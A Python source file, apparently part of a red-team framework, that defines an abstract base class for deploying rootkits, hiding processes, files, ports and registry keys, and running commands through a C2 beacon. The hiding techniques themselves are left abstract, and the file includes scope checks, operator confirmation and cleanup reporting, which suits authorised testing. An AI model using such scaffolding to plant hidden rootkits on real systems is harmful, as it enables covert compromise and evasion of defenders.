"""Rootkit Base — Abstract interface for rootkit deployment modules.

Defines the base class for all rootkit modules, including both
userland and kernel-mode rootkits. Provides common functionality
for hiding, cleanup, and status tracking.

Architecture:
    ┌──────────────────────────────────────────────────┐
    │                  RootkitBase (ABC)                │
    │  ├── deploy()    — Install rootkit components    │
    │  ├── hide()      — Activate hiding capabilities  │
    │  ├── unhide()    — Deactivate hiding             │
    │  ├── cleanup()   — Remove all rootkit artifacts  │
    │  └── status()    — Check rootkit state           │
    ├──────────────────────────────────────────────────┤
    │                                                   │
    │  UserlandRootkit     KernelRootkit    LinuxRootkit│
    │  (DLL injection,    (DKOM, SSDT,    (syscall     │
    │   API hooking,       minifilter,     hooks, LKM, │
    │   usermode hooks)    WFP filter)     proc hide)  │
    │                                                   │
    └──────────────────────────────────────────────────┘

SAFETY: All rootkit operations require explicit operator confirmation
at CRITICAL risk level. Full cleanup commands are always generated.

FOR AUTHORIZED RED TEAM OPERATIONS ONLY.
"""
from __future__ import annotations

import asyncio
import logging
import os
import sys
import time
from abc import ABC, abstractmethod
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import Any

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity

log = logging.getLogger("forge.rootkit.base")


class RootkitType(str, Enum):
    """Classification of rootkit types."""
    USERLAND = "userland"
    KERNEL = "kernel"
    BOOTKITS = "bootkit"
    FIRMWARE = "firmware"
    HYPERVISOR = "hypervisor"


class HideCapability(str, Enum):
    """Things a rootkit can hide."""
    PROCESS = "process"
    FILE = "file"
    REGISTRY = "registry"
    NETWORK = "network"
    MODULE = "module"
    USER = "user"
    SERVICE = "service"
    DRIVER = "driver"


class RootkitState(str, Enum):
    """Lifecycle state of a rootkit."""
    NOT_DEPLOYED = "not_deployed"
    DEPLOYING = "deploying"
    DEPLOYED = "deployed"
    ACTIVE = "active"            # Hiding capabilities engaged
    INACTIVE = "inactive"        # Deployed but not hiding
    CLEANING = "cleaning"
    CLEANED = "cleaned"
    FAILED = "failed"


@dataclass
class HiddenItem:
    """An item being hidden by the rootkit."""
    capability: HideCapability
    identifier: str              # PID, path, port, etc.
    description: str = ""
    hidden_since: float = 0.0
    status: str = "active"       # active, removed


@dataclass
class RootkitStatus:
    """Current status of a deployed rootkit."""
    rootkit_type: RootkitType = RootkitType.USERLAND
    state: RootkitState = RootkitState.NOT_DEPLOYED
    capabilities: list[HideCapability] = field(default_factory=list)
    hidden_items: list[HiddenItem] = field(default_factory=list)
    deployed_at: float = 0.0
    platform: str = ""           # windows, linux, macos
    arch: str = ""               # x64, x86, arm64
    artifacts: list[str] = field(default_factory=list)  # Files/drivers created
    cleanup_commands: list[str] = field(default_factory=list)
    errors: list[str] = field(default_factory=list)

    def to_dict(self) -> dict:
        return {
            "type": self.rootkit_type.value,
            "state": self.state.value,
            "capabilities": [c.value for c in self.capabilities],
            "hidden_count": len([h for h in self.hidden_items if h.status == "active"]),
            "deployed_at": self.deployed_at,
            "platform": self.platform,
            "artifacts": self.artifacts,
            "cleanup_commands": self.cleanup_commands,
        }


class RootkitBase(BaseModule, ABC):
    """Abstract base class for all rootkit modules.

    Provides common lifecycle management, hiding tracking, and
    cleanup generation for both userland and kernel rootkits.

    Subclasses must implement:
        - _deploy()   — Install rootkit components
        - _activate() — Enable hiding capabilities
        - _cleanup()  — Remove all artifacts
        - _status()   — Check current state
    """

    # Subclasses override these
    ROOTKIT_TYPE: RootkitType = RootkitType.USERLAND
    CAPABILITIES: list[HideCapability] = []
    PLATFORM: str = "windows"    # windows, linux, macos
    REQUIRES_ADMIN: bool = True
    REQUIRES_KERNEL: bool = False

    def __init__(self, *args: Any, **kwargs: Any) -> None:
        super().__init__(*args, **kwargs)
        self._status = RootkitStatus(
            rootkit_type=self.ROOTKIT_TYPE,
            capabilities=list(self.CAPABILITIES),
            platform=self.PLATFORM,
        )
        self._hidden_items: list[HiddenItem] = []

    async def run(self) -> ModuleResult:
        start = time.monotonic()
        target = self.config.target

        if not self.check_scope(target):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        # Rootkits require CRITICAL risk confirmation
        if not self.confirm_action(
            action=f"{self.ROOTKIT_TYPE.value} rootkit deployment",
            target=target,
            risk="CRITICAL — deploys rootkit components that modify OS internals. "
                 f"Type: {self.ROOTKIT_TYPE.value}, "
                 f"Capabilities: {', '.join(c.value for c in self.CAPABILITIES)}. "
                 "Full cleanup commands will be generated.",
        ):
            return self._make_result(start, skipped=True, skip_reason="operator declined")

        await self.rate_limit()

        action = self.config.extra.get("rootkit_action", "deploy")
        beacon_id = self.config.extra.get("beacon_id", "")
        attack_chain = self.config.extra.get("attack_chain", None)

        # Items to hide
        hide_pids = self.config.extra.get("hide_pids", [])
        hide_files = self.config.extra.get("hide_files", [])
        hide_ports = self.config.extra.get("hide_ports", [])
        hide_registry = self.config.extra.get("hide_registry", [])

        if action == "deploy":
            self._status.state = RootkitState.DEPLOYING
            await self._deploy(beacon_id)
            self._status.deployed_at = time.time()

            if self._status.state != RootkitState.FAILED:
                self._status.state = RootkitState.DEPLOYED

                # Activate hiding for requested items
                for pid in hide_pids:
                    await self._hide_item(HideCapability.PROCESS, str(pid), beacon_id)
                for path in hide_files:
                    await self._hide_item(HideCapability.FILE, path, beacon_id)
                for port in hide_ports:
                    await self._hide_item(HideCapability.NETWORK, str(port), beacon_id)
                for key in hide_registry:
                    await self._hide_item(HideCapability.REGISTRY, key, beacon_id)

                if self._hidden_items:
                    self._status.state = RootkitState.ACTIVE

        elif action == "cleanup":
            self._status.state = RootkitState.CLEANING
            await self._cleanup(beacon_id)
            self._status.state = RootkitState.CLEANED

        elif action == "status":
            await self._check_status(beacon_id)

        # Report results
        self._report_results(target)

        if attack_chain:
            for finding in self.findings:
                try:
                    attack_chain.ingest_finding(finding.to_dict())
                except Exception:
                    pass

        return self._make_result(start)

    # ── Abstract methods for subclasses ───────────────────────────────

    @abstractmethod
    async def _deploy(self, beacon_id: str) -> None:
        """Install rootkit components on the target system."""
        ...

    @abstractmethod
    async def _activate_hiding(
        self, capability: HideCapability, identifier: str, beacon_id: str,
    ) -> bool:
        """Activate a specific hiding capability for an item."""
        ...

    @abstractmethod
    async def _cleanup(self, beacon_id: str) -> None:
        """Remove all rootkit artifacts and restore system state."""
        ...

    @abstractmethod
    async def _check_status(self, beacon_id: str) -> None:
        """Check current rootkit deployment status."""
        ...

    # ── Common functionality ──────────────────────────────────────────

    async def _hide_item(
        self, capability: HideCapability, identifier: str, beacon_id: str,
    ) -> None:
        """Hide an item using the rootkit."""
        if capability not in self.CAPABILITIES:
            log.warning("Rootkit does not support %s hiding", capability.value)
            return

        success = await self._activate_hiding(capability, identifier, beacon_id)

        item = HiddenItem(
            capability=capability,
            identifier=identifier,
            hidden_since=time.time(),
            status="active" if success else "failed",
        )
        self._hidden_items.append(item)
        self._status.hidden_items.append(item)

    def _report_results(self, target: str) -> None:
        """Generate findings from rootkit operations."""
        if self._status.state in (RootkitState.DEPLOYED, RootkitState.ACTIVE):
            active_hidden = [
                h for h in self._hidden_items if h.status == "active"
            ]

            ev = Evidence(extra=self._status.to_dict())

            self.new_finding(
                title=(
                    f"Rootkit Deployed — {self.ROOTKIT_TYPE.value} "
                    f"({len(active_hidden)} items hidden)"
                ),
                severity=Severity.CRITICAL,
                description=(
                    f"Successfully deployed {self.ROOTKIT_TYPE.value} rootkit "
                    f"on {target}:\n\n"
                    f"  Type: {self.ROOTKIT_TYPE.value}\n"
                    f"  State: {self._status.state.value}\n"
                    f"  Capabilities: {', '.join(c.value for c in self.CAPABILITIES)}\n"
                    f"  Hidden items: {len(active_hidden)}\n"
                    f"  Artifacts: {len(self._status.artifacts)}\n\n"
                    "Hidden items:\n"
                    + "\n".join(
                        f"  [{h.capability.value}] {h.identifier}"
                        for h in active_hidden
                    )
                    + "\n\nCleanup commands:\n"
                    + "\n".join(
                        f"  {cmd}" for cmd in self._status.cleanup_commands
                    )
                ),
                reproduction_steps=self._status.cleanup_commands,
                remediation=(
                    f"1. Execute cleanup commands listed above\n"
                    "2. Verify removal with rootkit detection tools\n"
                    "3. Check system integrity (sfc /scannow on Windows)\n"
                    "4. Review event logs for rootkit indicators\n"
                    "5. Consider reimaging if kernel rootkit was deployed"
                ),
                references=[
                    "MITRE T1014 — Rootkit",
                    "MITRE T1562.001 — Impair Defenses: Disable or Modify Tools",
                ],
                evidence=ev,
                cvss_v31_vector="CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H",
                cvss_v40_vector="CVSS:4.0/AV:L/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H",
                mitre_attack=["TA0005/T1014", "TA0005/T1562.001"],
                target=target,
            )

            self._emit_event(
                "rootkit_deployed",
                rootkit_type=self.ROOTKIT_TYPE.value,
                hidden_count=len(active_hidden),
                host=target,
            )

        elif self._status.state == RootkitState.CLEANED:
            ev = Evidence(extra={"cleanup_commands": self._status.cleanup_commands})
            self.new_finding(
                title="Rootkit Cleaned — All Artifacts Removed",
                severity=Severity.INFO,
                description=(
                    f"Rootkit cleanup completed on {target}.\n\n"
                    f"Artifacts removed: {len(self._status.artifacts)}\n"
                    "Verify system integrity after cleanup."
                ),
                reproduction_steps=["Verify: run rootkit detection tools"],
                remediation="Verify system integrity post-cleanup.",
                references=["MITRE T1014"],
                evidence=ev,
                mitre_attack=["TA0005/T1014"],
                target=target,
            )

    async def _exec(self, cmd: str, beacon_id: str) -> str:
        """Execute command locally or via C2."""
        if beacon_id:
            try:
                from forge_c2.tasks.task_shell import ShellTask
                task = ShellTask(
                    task_id=f"rootkit_{beacon_id[:8]}",
                    command=cmd, timeout=15, hidden=True,
                )
                result = await task.execute()
                return result.output or ""
            except ImportError:
                pass

        try:
            proc = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=15.0)
            return stdout.decode(errors="replace") + stderr.decode(errors="replace")
        except Exception as exc:
            return f"ERROR: {exc}"


# ══════════════════════════════════════════════════════════════════════
#  UNIT TESTS
# ══════════════════════════════════════════════════════════════════════

class TestRootkitBase:
    """Tests for RootkitBase abstractions."""

    def test_rootkit_types(self) -> None:
        assert RootkitType.USERLAND.value == "userland"
        assert RootkitType.KERNEL.value == "kernel"

    def test_hide_capabilities(self) -> None:
        assert HideCapability.PROCESS.value == "process"
        assert HideCapability.FILE.value == "file"
        assert HideCapability.NETWORK.value == "network"

    def test_rootkit_state_lifecycle(self) -> None:
        states = [
            RootkitState.NOT_DEPLOYED,
            RootkitState.DEPLOYING,
            RootkitState.DEPLOYED,
            RootkitState.ACTIVE,
            RootkitState.CLEANING,
            RootkitState.CLEANED,
        ]
        for s in states:
            assert isinstance(s.value, str)

    def test_rootkit_status_to_dict(self) -> None:
        status = RootkitStatus(
            rootkit_type=RootkitType.USERLAND,
            state=RootkitState.ACTIVE,
            capabilities=[HideCapability.PROCESS, HideCapability.FILE],
        )
        d = status.to_dict()
        assert d["type"] == "userland"
        assert d["state"] == "active"
        assert len(d["capabilities"]) == 2

    def test_hidden_item(self) -> None:
        item = HiddenItem(
            capability=HideCapability.PROCESS,
            identifier="1234",
        )
        assert item.status == "active"
        assert item.identifier == "1234"
